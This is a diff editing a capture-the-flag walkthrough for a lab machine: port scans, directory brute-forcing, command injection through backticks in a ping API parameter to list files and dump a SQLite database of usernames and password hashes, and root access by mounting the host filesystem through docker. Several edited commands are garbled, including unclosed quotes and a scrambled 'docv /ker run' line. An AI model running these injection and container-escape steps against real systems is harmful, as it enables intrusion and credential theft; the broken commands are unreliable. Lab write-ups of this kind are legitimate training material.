@@ -27,7 +27,7 @@ nmap -sC -sV -Pn -p- -oN nmap_ultratech.txt 10.10.10.10
 ### Port 8081 (Node.js Express API)
 
 ```bash
-gobuster dir -u http://10.10.10.10:8081 -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://10.10.10.10:8081 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 ```
 
 **Found:**  
@@ -39,7 +39,7 @@ gobuster dir -u http://10.10.10.10:8081 -w /usr/share/wordlists/dirb/common.txt
 ### Port 31331 (Apache)
 
 ```bash
-gobuster dir -u http://10.10.10.10:31331 -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://10.10.10.10:31331 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 ```
 
 **Found:**
@@ -56,21 +56,21 @@ Inside `/js`, there is `api.js` which points to `/ping?ip=`.
 Test the API:
 
 ```bash
-curl "http://10.10.10.10:8081/ping?ip=127.0.0.1"
+curl "http://10.10.10.10:8081/ping?ip=`whoami`
 ```
 
 It works.  
 Try injection:
 
 ```bash
-curl "http://10.10.10.10:8081/ping?ip=127.0.0.1;ls"
+curl "http://10.10.10.10:8081/ping?ip=`pwd`
 ```
 
 Not working (filtered).  
 But command substitution works:
 
 ```bash
-curl "http://10.10.10.10:8081/ping?ip=127.0.0.1`ls`"
+curl "http://10.10.10.10:8081/ping?ip=`ls -la`"
 ```
 
 **Result:** found file `utech.db.sqlite`.
@@ -82,7 +82,7 @@ curl "http://10.10.10.10:8081/ping?ip=127.0.0.1`ls`"
 Read contents:
 
 ```bash
-curl "http://10.10.10.10:8081/ping?ip=127.0.0.1`cat utech.db.sqlite`"
+curl "http://10.10.10.10:8081/ping?ip=`cat utech.db.sqlite`"
 ```
 
 The SQLite database contains usernames and hashes.
@@ -138,16 +138,22 @@ The user belongs to the **docker** group.
 
 ## 🚀 8. Privilege Escalation via Docker
 
+Privilege Escalation
+We will use the GTFOBIN to elevate privileges on the target machine. It tells us that in order to get out of the restricted environment of docker, we need to spawn an interactive shell inside the docker.
+
+We run the script directly from the GTFOBIN. However, it gave us an error stating that it was unable to find the alpine image. Therefore, we use the docker ps -a command to list the images available on this Docker instance. We observe that there is an image named bash. As a result, we replace the image name from alpine to bash in the command. After running the modified command again, we find that we are able to gain root access. Finally, we use the cat command to read the private key for the root user, as required to conclude this machine.
+
 Run container mounting host:
 
 ```bash
-docker run -it -v /:/mnt bash
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+docker ps -a
 ```
 
 Change root:
 
 ```bash
-chroot /mnt
+docv /ker run -:/mnt --rm -it bash chroot /mnt sh
 ```
 
 Now we are root 🎉
